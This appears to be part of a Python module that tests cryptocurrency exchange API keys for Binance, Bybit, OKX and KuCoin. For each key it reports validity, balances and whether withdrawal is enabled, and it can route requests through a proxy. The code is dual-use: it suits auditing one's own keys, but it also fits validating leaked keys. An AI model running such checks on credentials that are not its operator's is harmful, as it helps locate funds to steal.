    ts = str(int(time.time() * 1000))
    path = "/api/v1/accounts"
    try:
        sec_bytes = base64.b64decode(secret.encode())
    except (ValueError, TypeError):
        sec_bytes = secret.encode()
    sign = _hmac_b64(sec_bytes, ts + "GET" + path)
    headers = {
        "KC-API-KEY": key, "KC-API-SIGN": sign, "KC-API-TIMESTAMP": ts,
        "KC-API-PASSPHRASE": base64.b64encode((passphrase or "").encode()).decode(),
        "KC-API-KEY-VERSION": "2",
    }
    async with session.get(
        "https://api.kucoin.com" + path,
        headers=headers, proxy=proxy, timeout=timeout_s,
    ) as resp:
        if resp.status != 200:
            return _ex_error(resp.status)
        data = await resp.json(content_type=None)
        if str(data.get("code")) != "200000":
            return {"status": "invalid", "detail": f"code {data.get('code')}",
                    "balances": [], "withdraw_enabled": None}
        coins = [
            f"{a.get('currency')}={float(a.get('balance') or 0):.6g}"
            for a in data.get("data") or [] if float(a.get("balance") or 0) > 0
        ]
    return {"status": "valid", "balances": coins[:8], "withdraw_enabled": None,
            "detail": ", ".join(coins[:4]) if coins else "баланс 0"}


async def verify_exchange_keypair(session: aiohttp.ClientSession, exchange: str,
                                 key: str, secret: str, passphrase: str | None = None,
                                 proxy: str | None = None,
                                 timeout_s: float = 8.0) -> dict[str, Any]:
    """Read-only проверка ключа биржи: HMAC-подпись, баланс + право вывода."""
    result: dict[str, Any] = {"exchange": exchange, "key": key[:8] + "…",
                              "status": "unknown", "detail": "",
                              "balances": [], "withdraw_enabled": None}
    try:
        if exchange == "binance":
            result.update(await _verify_binance(session, key, secret, proxy, timeout_s))
        elif exchange == "bybit":
            result.update(await _verify_bybit(session, key, secret, proxy, timeout_s))
        elif exchange == "okx":
            result.update(await _verify_okx(session, key, secret, passphrase, proxy, timeout_s))
        elif exchange == "kucoin":
            result.update(await _verify_kucoin(session, key, secret, passphrase, proxy, timeout_s))
        else:
            result["detail"] = f"unknown exchange {exchange}"
    except (aiohttp.ClientError, TimeoutError, OSError, ValueError) as exc:
        result["detail"] = type(exc).__name__
    return result
